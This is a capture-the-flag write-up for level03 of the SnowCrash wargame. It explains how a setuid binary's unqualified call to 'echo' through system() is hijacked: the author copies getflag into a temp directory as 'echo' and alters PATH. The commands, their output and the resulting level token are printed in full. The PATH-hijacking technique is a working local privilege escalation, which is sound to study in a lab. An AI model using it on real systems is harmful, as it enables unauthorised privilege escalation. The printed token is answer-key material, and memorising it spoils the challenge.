# Level03

After switching to the level03 user, we are greeted by an executable file with special permissions, owned by flag03

```bash
level03@SnowCrash:~$ ls -la
total 24
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The fact that it's an executable with special permissions made me think I should take control of the program to execute the `getflag` command

### Exploiting the binary

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

- Filtering [strings](http://ix.io/27EI) from the program shows the program is using the echo binary in it's environment with [system(3)](http://man7.org/linux/man-pages/man3/system.3.html) to print the message instead of using write(2)

```bash
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
...
system
getegid
geteuid
__libc_start_main
...
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
...
/home/user/level03/level03.c
...

```

- We can use a different echo command

```bash
level03@SnowCrash:~$ which getflag
/bin/getflag

level03@SnowCrash:~$ mkdir test
mkdir: cannot create directory `test': Permission denied

level03@SnowCrash:~$ mktemp -d
/tmp/tmp.yJuq6aWVv2
level03@SnowCrash:~$ cp /bin/getflag /tmp/tmp.yJuq6aWVv2/echo
level03@SnowCrash:~$ chmod -R 777 /tmp/tmp.yJuq6aWVv2
```

- Then execute our new `echo` binary by modifing the `PATH` variable in the environment

```bash
level03@SnowCrash:~$ PATH=/tmp/tmp.yJuq6aWVv2 ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### Go to level04

```bash
su level04
Password:
<<< 'qi0maab88jeaj46qoumi7maus'

level04@SnowCrash:~$
```
